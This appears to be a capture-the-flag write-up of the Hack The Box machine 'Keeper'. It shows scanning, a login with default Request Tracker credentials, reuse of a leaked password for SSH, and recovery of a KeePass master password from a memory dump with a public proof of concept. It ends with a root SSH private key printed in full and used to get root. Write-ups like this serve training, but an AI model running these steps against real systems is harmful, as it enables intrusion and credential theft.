---
layout: post
title: HTB Keeper Writeup  
subtitle: Easy Linux Box
thumbnail-img: /assets/img/keeper/keeper.png
tags: [HTB]
---

| Name | keeper |
| :------ |:--- |
| OS | Linux |
| DIFFICULTY | Easy |

# Port Scan
My port scan revealed that there were 2 open ports, TCP/22 and TCP/80. Port 22 is running SSH and port 80 is running a HTTP server.
```
nmap -p- --min-rate=1000 -oN allPorts.nmap 10.10.11.227

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

nmap -p 22,80 -sVC -oN scriptScan.nmap 10.10.11.227
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# TCP/80 HTTP
Navigating to the webpage we are instructed to submit a IT support ticket to `tickets.keeper.htb`.
![keeper](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/keeper/1.png)

With a new subdomain I will add the following entry to my `/etc/hosts` file:
```
10.10.11.227    tickets.keeper.htb
```

Going to `http://tickets.keeper.htb/rt/` shows that this is a IT support ticket tracking application. 
![keeper](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/keeper/2.png)


When I come across applications like this I usually test for default credentials. It may seem simple but it is something that I see all the time on real networks. The easiest way to find this is through google. The default creds are `root:password`
![keeper](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/keeper/3.png)

Those credentials get me authenticated!
![keeper](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/keeper/4.png)


It looks like there is one ticket in the que

![keeper](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/keeper/5.png)

It looks like the user who submitted the ticket is having issues with their `keepass`, however inorgaard, has removed the attachment. 

![keeper](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/keeper/8.png)

Poking around the application some more I started to look at the `inorgaard` users profile and there was a note with a password!
![keeper](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/keeper/6.png)

I tried to use that password for SSH and it got me in!
```
┌──(kali㉿kali)-[~/htb/keeper]
└─$ ssh lnorgaard@10.10.11.227
lnorgaard@10.10.11.227's password: Welcome2023!
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Sun Feb 11 01:07:33 2024 from 10.10.14.10
lnorgaard@keeper:~$ 
```

# Root
Like mentioned in the ticket is a zip folder in lnorgaard home folder that contained a keepass dump: 
```
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
```

I transferred the file over to my machine via a `python3` webserver, its a pretty big file so be patient. 
```
lnorgaard@keeper:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...


┌──(kali㉿kali)-[~/htb/keeper]
└─$ wget 10.10.11.227:8080/RT30000.zip                                    
--2024-02-11 00:27:54--  http://10.10.11.227:8080/RT30000.zip
Connecting to 10.10.11.227:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 87391651 (83M) [application/zip]
Saving to: ‘RT30000.zip’

RT30000.zip                             100%[============================================================================>]  83.34M   921KB/s    in 89s     

2024-02-11 00:29:23 (962 KB/s) - ‘RT30000.zip’ saved [87391651/87391651]
```

After unzipping the file we are left with dump as well as the keepass vault.
```
┌──(kali㉿kali)-[~/htb/keeper]
└─$ unzip RT30000.zip 
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx 
```

Last year a vulnerability that came out where we can extract the master password from a dump file. Using [this](https://github.com/vdohney/keepass-password-dumper) POC we can extract the master password.
```
git clone https://github.com/vdohney/keepass-password-dumper.git
cd keepass-password-dumper
```

The exploit/tool is written in `dotnet` and `dotnet` can be a little finicky so I'll spin up a docker container to run the exploit in. 
```
docker run --rm -it -v $(pwd):/data mcr.microsoft.com/dotnet/sdk:7.0.100 
```

Next we can run the exploit and we get a weird password of `dgrød med fløde`
```
┌──(kali㉿kali)-[~/htb/keeper]
└─$ sudo docker run --rm -it -v $(pwd):/zon mcr.microsoft.com/dotnet/sdk:7.0.100                            
root@41ef308aa921:/# cd zon/keepass-password-dumper/                      
root@41ef308aa921:/zon/keepass-password-dumper# dotnet run ../KeePassDumpFull.dmp 

[snip]
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
```

Trying to open the keepass with that password didnt work:
```
sudo apt install kpcli

┌──(kali㉿kali)-[~/htb/keeper]
└─$ kpcli                    

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> open passcodes.kdbx
Provide the master password: *************************
Error opening file: Couldn't load the file passcodes.kdbx

```

I next googled `dgrød med fløde` as the username looked nordic and I found that it is a real thing but something weird happened when retrieving the password from the dump
![keeper](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/keeper/7.png)

Using the corrected password of `rødgrød med fløde` gets me in! 
```
kpcli:/> open passcodes.kdbx                                                                                                                        [23/1353]
Provide the master password: *************************                 
kpcli:/> ls                                                                   
=== Groups ===                                                                
passcodes/                                                                    
kpcli:/> cd passcodes/                                                        
kpcli:/passcodes> ls                                                          
=== Groups ===          
eMail/                                                                        
General/                                                                      
Homebanking/                                                                  
Internet/                                                                     
Network/                                                                      
Recycle Bin/                                                                  
Windows/                                                                      
kpcli:/passcodes> cd Network/                                                 
kpcli:/passcodes/Network> ls                                                  
=== Entries ===                                                               
0. keeper.htb (Ticketing Server)                                          
1. Ticketing System                                                       
kpcli:/passcodes/Network> show 0 -f                                           
                                                                              
Title: keeper.htb (Ticketing Server)                                                                                                                         
Uname: root
 Pass: F4><3K0nd!         
Notes: PuTTY-User-Key-File-3: ssh-rsa
       Encryption: none
       Comment: rsa-key-20230519
       Public-Lines: 6        
       AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
       8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
       EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
       Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
       FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
       LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
       Private-Lines: 14
       AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
       oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
       kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
       f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
       VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
       UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
       OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
       in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
       SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
       09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
       xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
       AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
       AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
       NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
       Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0

```

Inside is a `putty` ssh file for the root user. To use this on kali I'll have to install putty tools `sudo apt install putty-tools`. 

I saved the following to `putty.key`
```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

Then we can generate a ssh key that openSSH can use
`puttygen putty.key -O private-openssh -o keeper.key`

Next we can set the correct permissions and then use it to authenticate!
```
┌──(kali㉿kali)-[~/htb/keeper]
└─$ chmod 600 keeper.key 
                                                                                                                                                             
┌──(kali㉿kali)-[~/htb/keeper]
└─$ ssh -i keeper.key root@10.10.11.227
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Sun Feb 11 01:26:53 2024 from 10.10.14.10
root@keeper:~# 
```
